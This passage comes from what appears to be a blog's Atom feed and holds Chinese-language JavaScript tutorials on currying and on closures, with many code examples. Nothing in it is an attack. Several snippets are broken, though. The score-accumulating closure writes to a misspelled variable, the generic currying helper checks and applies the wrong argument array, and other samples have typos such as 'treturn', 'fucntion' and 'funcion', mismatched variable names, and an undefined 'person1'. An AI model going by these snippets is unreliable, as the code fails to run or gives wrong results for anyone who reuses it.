title="Currying的特点"></a>Currying的特点</h2><ul><li>参数复用：如果是相同的参数，在计算之后不需要再次重新传参计算</li><li>提前返回：多次调用多次内部判断，可以直接把第一次判断的结果返回外部接受</li><li>延迟执行：避免重复执行程序，等真正需要结果的时候，再执行</li></ul><h3 id="参数复用"><a href="#参数复用" class="headerlink" title="参数复用"></a>参数复用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function curryingAdd(a)&#123;</span><br><span class="line">    return function(b)&#123;</span><br><span class="line">        return function(c)&#123;</span><br><span class="line">            return a + b + c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var add1 = curryingAdd(1);</span><br><span class="line">var add2 = add1(2);</span><br><span class="line"></span><br><span class="line">console.log(add2(3));</span><br><span class="line">console.log(add2(4));</span><br></pre></td></tr></table></figure><p>还是以刚才的例子做说明，通过复用参数，我们可以实现空间换时间，在调用add2进行计算时，实际上只进行了一次计算。</p><h3 id="提前返回"><a href="#提前返回" class="headerlink" title="提前返回"></a>提前返回</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var addEvent = function(el, type, fn, capture)&#123;</span><br><span class="line">    if(window.addEventListener)&#123;</span><br><span class="line">        el.addEventListener(type, function()&#123;</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if(window.attachEvent)&#123;</span><br><span class="line">        el.attachEvent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addEvent(div,click,callback,false);   //判断一次</span><br><span class="line">addEvent(p,click,callback,false);     //判断二次</span><br><span class="line">addEvent(span,click,callback,false);  //判断三次</span><br></pre></td></tr></table></figure><p>上述代码是兼容浏览器添加事件的一段常用的代码，但在使用中，会多次进行浏览器版本的判断，而浏览器的版本在打开浏览器的时候就已经确定，重复的判断反而会降低使用性能，所以可以利用柯里化思想对上述代码进行下面的改进。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var addEvent = function()&#123;</span><br><span class="line">    if(window.addEventListener)&#123;</span><br><span class="line">        return function(el, type, fn, capture)&#123;</span><br><span class="line">            el.addEventListener(type, function()&#123;&#125;);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if(window.attachEvent)&#123;</span><br><span class="line">        return function(el, type, fn, capture)&#123;</span><br><span class="line">            el.attachEvent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//只判断一次</span><br><span class="line">var addEvent_new = addEvent</span><br><span class="line"></span><br><span class="line">addEvent_new(div,click,callback,false);   </span><br><span class="line">addEvent_new(p,click,callback,false);     </span><br><span class="line">addEvent_new(span,click,callback,false);</span><br></pre></td></tr></table></figure><h3 id="延迟执行"><a href="#延迟执行" class="headerlink" title="延迟执行"></a>延迟执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var curryScore = function(fn)&#123;</span><br><span class="line">    var _allScore = [];  //存放分数</span><br><span class="line">    return function()&#123;</span><br><span class="line">        if(arguments.length === 0)&#123;</span><br><span class="line">            return fn.apply(null,_allScore); //对象冒充，形实转换</span><br><span class="line">        &#125;</span><br><span class="line">        _allScorll = _allScore.concat([].slice.call(arguments));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var allScore = 0;</span><br><span class="line">var addScore = curryScore(function()&#123;</span><br><span class="line">    for(var i = 0; i &lt; arguments.length; i++)&#123;</span><br><span class="line">        allScore +=arguments[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">addScore(2);</span><br><span class="line">addScore(3);</span><br><span class="line">addScore(3);</span><br><span class="line">addScore(2);</span><br><span class="line">addScore(1);</span><br><span class="line">addScore();  //11</span><br></pre></td></tr></table></figure><p>上述代码的思想就是先把传入的参数都保存起来，当达到某个延迟条件时，进行输出。</p><h2 id="通用封装方法"><a href="#通用封装方法" class="headerlink" title="通用封装方法"></a>通用封装方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 支持多参数传递</span><br><span class="line">function progressCurrying(fn, args) &#123;</span><br><span class="line"></span><br><span class="line">    var _this = this</span><br><span class="line">    var len = fn.length;</span><br><span class="line">    var args = args || [];</span><br><span class="line"></span><br><span class="line">    return function() &#123;</span><br><span class="line">        var _args = Array.prototype.slice.call(arguments);</span><br><span class="line">        Array.prototype.push.apply(args, _args);</span><br><span class="line"></span><br><span class="line">        // 如果参数个数小于最初的fn.length，则递归调用，继续收集参数</span><br><span class="line">        if (_args.length &lt; len) &#123;</span><br><span class="line">            return progressCurrying.call(_this, fn, _args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 参数收集完毕，则执行fn</span><br><span class="line">        return fn.apply(this, _args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Currying的性能开销"><a href="#Currying的性能开销" class="headerlink" title="Currying的性能开销"></a>Currying的性能开销</h2><p>虽然柯里化提高了函数的适用性，但是它还是会产生一些性能的开销。</p><ul><li>存取arguments对象通常要比存取命名参数要慢一点</li><li>一些老版本的浏览器在arguments.length的实现上是相当慢的</li><li>使用fn.apply() 和 fn.call()通常比直接调用fn()稍微慢点</li><li>创建大量嵌套作用域和闭包函数会带来花销，无论是在内存还是速度上</li></ul><p>但性能的主要瓶颈在操作DOM结点的开销，Currying这部分性能损耗基本可以忽略不计。</p><h2 id="经典柯里化面试题"><a href="#经典柯里化面试题" class="headerlink" title="经典柯里化面试题"></a>经典柯里化面试题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// 实现一个add方法，使计算结果能够满足如下预期：</span><br><span class="line">add(1)(2)(3) = 6;</span><br><span class="line">add(1, 2, 3)(4) = 10;</span><br><span class="line">add(1)(2)(3)(4)(5) = 15;</span><br><span class="line"></span><br><span class="line">function add() &#123;</span><br><span class="line">    // 第一次执行时，定义一个数组专门用来存储所有的参数</span><br><span class="line">    var _args = Array.prototype.slice.call(arguments);</span><br><span class="line"></span><br><span class="line">    // 在内部声明一个函数，利用闭包的特性保存_args并收集所有的参数值</span><br><span class="line">    var _adder = function() &#123;</span><br><span class="line">        _args.push(...arguments);</span><br><span class="line">        return _adder;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // 利用toString隐式转换的特性，当最后执行时隐式转换，并计算最终的值返回</span><br><span class="line">    _adder.toString = function () &#123;</span><br><span class="line">        return _args.reduce(function (a, b) &#123;</span><br><span class="line">            return a + b;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    return _adder;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(1)(2)(3)                // 6</span><br><span class="line">add(1, 2, 3)(4)             // 10</span><br><span class="line">add(1)(2)(3)(4)(5)          // 15</span><br><span class="line">add(2, 6)(1)                // 9</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;老是听大佬们口中谈及函数柯里化，在没有了解之前，我一直认为这是一个十分高深的东西，然而在接触后也深深被他的魅力吸引，那么究竟什么是柯里化？柯里化又有什么好处？作为一个前端工程狮，这是你必须掌握的高级技能。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;什么是柯里化-Currying&quot;&gt;&lt;a href=&quot;#什么是柯里化-Currying&quot; class=&quot;headerlink&quot; title=&quot;什么是柯里化(Currying)&quot;&gt;&lt;/a&gt;什么是柯里化(Currying)&lt;/h2&gt;&lt;p&gt;柯里化是把接受多个参数的函数变换成接受一个单一参数（最初函数的第一个参数）的函数，并且返回接受余下的参数且返回结果的新函数的技术。也就是将具有多个元的函数转化为具有较少元的函数。&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="JS" scheme="http://dangoying.ink/tags/JS/"/>
    
  </entry>
  
  <entry>
    <title>JS函数表达式（闭包）</title>
    <link href="http://dangoying.ink/JS%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%88%E9%97%AD%E5%8C%85%EF%BC%89.html"/>
    <id>http://dangoying.ink/JS函数表达式（闭包）.html</id>
    <published>2019-05-27T14:27:49.000Z</published>
    <updated>2019-06-02T10:00:48.461Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="函数声明和函数表达式"><a href="#函数声明和函数表达式" class="headerlink" title="函数声明和函数表达式"></a>函数声明和函数表达式</h3><p>函数声明：重要特征是函数声明提升，在执行代码之前会先读取函数声明。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sayHi();</span><br><span class="line">function sayHi()&#123;</span><br><span class="line">    alert(&quot;Hi&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>函数表达式（匿名函数）：匿名函数的name属性是空字符串，有时也称函数拉姆达函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var sayHi = function()&#123;</span><br><span class="line">    alert(&quot;Hi&quot;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>使用arguments.callee指向正在执行的函数指针，可以实现对函数的递归调用，且比直接使用函数名更加安全。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function facorial(num)&#123;</span><br><span class="line">    if(num &lt;= 1)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return num * arguments.callee(num-1); //使之与函数名解耦合</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上方法在严格模式下会出错，在严格模式下，可使用命名函数表达式达成相同的结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var factorial = (function f(num)&#123;</span><br><span class="line">    if(num &lt;= 1)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return num * f(num-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><h3 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h3><p>闭包是指有权访问另一个函数作用域中的变量的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function createComparesonFuncion(popertyName)&#123;</span><br><span class="line">    return function(object1,object2)&#123;</span><br><span class="line">        var value1 = object1[propertyName];</span><br><span class="line">        var value2 = object2[propertyName];</span><br><span class="line">        if(value1 &lt; value2)&#123;</span><br><span class="line">            return -1;</span><br><span class="line">        &#125; else if(value1 &gt; value2)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>一般当函数执行完毕后，局部活动对象就会被销毁，内存中仅保存全局作用域，但闭包不同，在另一个函数内部定义的函数会将包含函数（即外部函数）的活动对象加到它的作用域链中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\\创建函数</span><br><span class="line">var compareName = createComparesonFunction(&quot;name&quot;);</span><br><span class="line">var result = compareNames(&#123;name:&quot;Nicholas&quot;&#125;,&#123;name:&quot;Greg&quot;&#125;);  //调用函数</span><br><span class="line">compareNames = null;  //解除对匿名函数的引用</span><br></pre></td></tr></table></figure></p><p><img src="../assets/20190527/pic1.png" alt="Alt text"></p><h3 id="闭包与变量"><a href="#闭包与变量" class="headerlink" title="闭包与变量"></a>闭包与变量</h3><p>闭包只能取得包含函数中任何变量的最后一个值，因为闭包保存的是整个变量对象，而不是某个特殊变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function createFunctions()&#123;</span><br><span class="line">    var result = new Array();</span><br><span class="line">    for(var i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">        result[i] = function() &#123;</span><br><span class="line">            return i;   //每次返回都为10</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上代码，通过匿名函数强制让闭包行为符合预期。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function createFunctions()&#123;</span><br><span class="line">    var result = new Array();</span><br><span class="line">    for(var i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">        result[i] = function(num) &#123;   //使用匿名函数，则立即执行匿名函数</span><br><span class="line">            return function(num)&#123;</span><br><span class="line">                return num;</span><br><span class="line">            &#125;;   </span><br><span class="line">        &#125;(i);   //值传递，把i赋值给num</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="this对象"><a href="#this对象" class="headerlink" title="this对象"></a>this对象</h3><p>匿名函数的执行环节具有全局性，因此其this对象通常指向window。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;The window&quot;;</span><br><span class="line">var object = &#123;</span><br><span class="line">    name : &quot;MyObject&quot;,</span><br><span class="line">    getNameFunc ： function()&#123;</span><br><span class="line">        return function()&#123;</span><br><span class="line">            return this.name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">alert(object.getNameFunc()());   //&quot;The window&quot;</span><br></pre></td></tr></table></figure></p><p>每个函数在调用时都会自动取得两个特殊变量<code>this</code>和<code>arguments</code>内部函数只会搜索到其活动对象为止，所以不能直接访问外部函数中的这两个变量。</p><p>可以通过把外部作用域中的this对象保存在闭包能访问到的变量里，让闭包访问。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;The window&quot;;</span><br><span class="line">var object = &#123;</span><br><span class="line">    name : &quot;MyObject&quot;;</span><br><span class="line">    getNameFunc : function()&#123;</span><br><span class="line">        var that = this;</span><br><span class="line">        return function()&#123;</span><br><span class="line">            return that.name;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">alert(object.getNameFunc()());  //&quot;MyObject&quot;</span><br></pre></td></tr></table></figure></p><p>特殊情况，this值可能会意外地改变。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;The window&quot;;</span><br><span class="line">var object = &#123;</span><br><span class="line">    name : &quot;MyObject&quot;;</span><br><span class="line">    getName : function()&#123;</span><br><span class="line">        treturn this.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">object.getName();   //&quot;MyObject&quot;</span><br><span class="line">(object.getName)();   //&quot;MyObject&quot;,相当于引用了一个函数，this得到了维持</span><br><span class="line">(object.getName = object.getName)();   //&quot;The window&quot;，this值不能得到维持</span><br></pre></td></tr></table></figure></p><h3 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//该闭包导致element的引用数无法减少，element不会被回收</span><br><span class="line">function assignHandler()&#123;</span><br><span class="line">    var element = document.getElementById(&quot;someElement&quot;);</span><br><span class="line">    element.onlick = function()&#123;</span><br><span class="line">        alert(element.id);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模仿块级作用域"><a href="#模仿块级作用域" class="headerlink" title="模仿块级作用域"></a>模仿块级作用域</h3><p>JavaScript没有块级作用域的概念<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fucntion outputNumbers(count)&#123;</span><br><span class="line">    for(var i = 0; i &lt; count; i++)&#123;</span><br><span class="line">        alert(i);</span><br><span class="line">    &#125;</span><br><span class="line">    var i;    //重新声明变量也不会改变它的值</span><br><span class="line">    alert(i);  //count值，从i定义开始，就可以在函数内部随处访问</span><br><span class="line">    //而在Java，c++中，变量i只会在for循环的语句块中有定义</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以用匿名函数来模仿块级作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    //这里是块级作用域</span><br><span class="line">&#125;)();   //定义并立即调用了一个匿名函数，括号表示它实际上是一个函数表达式</span><br><span class="line">var someFunction = function()&#123;</span><br><span class="line">    //这里是块级作用域</span><br><span class="line">&#125;;</span><br><span class="line">someFunction();</span><br></pre></td></tr></table></figure></p><p>JavaScript将function当作一个函数声明的开始，而函数声明后面不能跟圆括号，而函数表达式可以。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function outputNumber(count)&#123;</span><br><span class="line">    (function()&#123;</span><br><span class="line">        for(var i = 0; i &lt; count; i++)&#123;</span><br><span class="line">            alert(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">    alert(i);   //出错</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>私有作用域的i在执行结束后被销毁，私有作用域能访问count，因为其为闭包</p><h3 id="私有变量"><a href="#私有变量" class="headerlink" title="私有变量"></a>私有变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function MyObject()&#123;</span><br><span class="line">    //私有变量和私有函数</span><br><span class="line">    var privateVariable = 10;</span><br><span class="line">    function privateFunction()&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //特权方法</span><br><span class="line">    this.publicMethod = function()&#123;</span><br><span class="line">        privateVariable ++;</span><br><span class="line">        return privateFunction();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用私有和特权成员，可以隐藏那些不应该被直接修改的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">funcion Person(name)&#123;</span><br><span class="line">    this.getName = function()&#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;;</span><br><span class="line">    this.setName = funcion(value)&#123;</span><br><span class="line">        name = value;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">var person = new Person(&quot;Nicholas&quot;);</span><br><span class="line">alert(person.getName());   //&quot;Nicholas&quot;</span><br><span class="line">person.setName(&quot;Greg&quot;);</span><br><span class="line">alert(person.getName());  //&quot;Greg&quot;</span><br></pre></td></tr></table></figure></p><p>在构造函数外部没有办法访问name</p><h3 id="静态私有变量"><a href="#静态私有变量" class="headerlink" title="静态私有变量"></a>静态私有变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    //私有变量和私有函数</span><br><span class="line">    var privateVar = 10;</span><br><span class="line">    function privateFunc()&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //构造函数</span><br><span class="line">    MyObject = function()&#123;</span><br><span class="line">    &#125;;   //没有使用var，所以声明的是全局的类</span><br><span class="line">    //公有/特权方法</span><br><span class="line">    MyObject.prototype.publicMethod = function()&#123;</span><br><span class="line">        privateVar ++;</span><br><span class="line">        return privateFunc();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>该模式与构造函数定义区别在于，其私有变量和函数是由实例共享的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var name = &quot;&quot;;</span><br><span class="line">    Person = function(value)&#123;</span><br><span class="line">        name = value;</span><br><span class="line">    &#125;;</span><br><span class="line">    Person.prototype.getName = function()&#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;;</span><br><span class="line">    Person.prototype.setName = function(value)&#123;</span><br><span class="line">        name = value;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line">var person2 = new Person(&quot;Van&quot;);</span><br><span class="line">alert(person1.getName());  //&quot;Van&quot;</span><br><span class="line">person1.setName(&quot;Greg&quot;);</span><br><span class="line">alert(person1.getName());  //&quot;Greg&quot;</span><br><span class="line">var person2 = new Person(&quot;John&quot;);</span><br><span class="line">alert(person1.getName());  //&quot;John&quot;</span><br><span class="line">alert(person2.getName());  //&quot;John&quot;</span><br><span class="line">//name为共享属性</span><br></pre></td></tr></table></figure></p><h3 id="模块模式"><a href="#模块模式" class="headerlink" title="模块模式"></a>模块模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var singleton = function()&#123;</span><br><span class="line">    var privateVar = 10;</span><br><span class="line">    function privateFun()&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //特权/公有方法和属性</span><br><span class="line">    return&#123;</span><br><span class="line">        publicProperty : true,</span><br><span class="line">        publicMethod ：function()&#123;</span><br><span class="line">            privateVar++;</span><br><span class="line">            return privateFunc();</span><br><span class="line">        &#125;  //对象字面量是单例的公共接口</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure><h3 id="增强的模块模式"><a href="#增强的模块模式" class="headerlink" title="增强的模块模式"></a>增强的模块模式</h3><p>增强模块模式适合那些单例必须是某种类型的实例，同时还必须增加某些属性和方法对其加以增强的情况。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var singleton = function()&#123;</span><br><span class="line">    var privateVar = 10;</span><br><span class="line">    function privateFun()&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    var object = new CustomType();</span><br><span class="line">    object.publicProperty = true;</span><br><span class="line">    object.publicMethod = function()&#123;</span><br><span class="line">        privateVar++;</span><br><span class="line">        return privateFun();</span><br><span class="line">    &#125;;</span><br><span 